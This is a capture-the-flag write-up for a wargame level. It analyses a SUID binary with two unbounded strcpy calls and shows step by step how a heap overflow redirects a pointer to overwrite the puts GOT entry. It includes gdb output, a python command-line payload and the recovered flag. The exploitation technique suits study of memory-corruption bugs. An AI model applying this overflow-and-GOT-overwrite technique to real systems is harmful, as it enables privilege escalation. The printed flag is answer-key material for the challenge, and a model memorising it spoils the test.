# Level 7

Same recon as level0: SUID **level8**.

## Analysis

```c
char c[80];   // global

void m(void) { printf("%s - %d\n", c, time(NULL)); }   // prints c, never called

int main(int argc, char **argv) {
    int **a = malloc(8);  a[1] = malloc(8);
    int **b = malloc(8);  b[1] = malloc(8);
    strcpy((char*)a[1], argv[1]);     // unbounded
    strcpy((char*)b[1], argv[2]);     // dest is a pointer we can corrupt
    fgets(c, 0x44, fopen("/home/user/level8/.pass", "r"));   // flag into c
    puts("~~");                        // libc call through the GOT
}
```

The chunks land in order `a, a[1], b, b[1]`. The first `strcpy` is unbounded, so overflowing `a[1]` reaches `b[1]` and rewrites that pointer. The **second** `strcpy` then writes `argv[2]` to wherever `b[1]` now points.

> **Chained write.** Two `strcpy`s with no size check let us write anywhere: the first overflow picks where the second one writes. No format string needed.

Plan: point `b[1]` at the `puts` GOT entry, then let the second strcpy write `m`'s address there. `puts("~~")` then runs `m`, which prints `c` (the flag fgets just loaded).

`m` and `puts@GOT`:

```
(gdb) info functions
0x080484f4  m
$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

## Exploit

### Offset from a[1] to b[1]

Break before the first strcpy, dump the heap from `a[1]` (in `eax`):

```
(gdb) b *0x080485a0
(gdb) r AAAA BBBB
(gdb) info registers eax
eax            0x804a018                  <- a[1]
(gdb) x/20x $eax
0x804a028: 0x00000002 0x0804a038 ...      <- b[0], then b[1]
```

`a[1]` = `0x0804a018`, `b[1]` = `0x0804a02c`, offset = `0x14` = **20 bytes**.

### Run

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1776694943
```

- `argv[1]` = 20 padding + `\x28\x99\x04\x08` (puts@GOT) → first strcpy sets `b[1]` = puts@GOT.
- `argv[2]` = `\xf4\x84\x04\x08` (m) → second strcpy writes m into puts@GOT.
- `puts("~~")` looks up its address in the GOT → now runs `m` → prints the flag (the `- 1776694943` is `time(NULL)`).

Both addresses are null-byte-free, so they survive as command-line args.

Flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
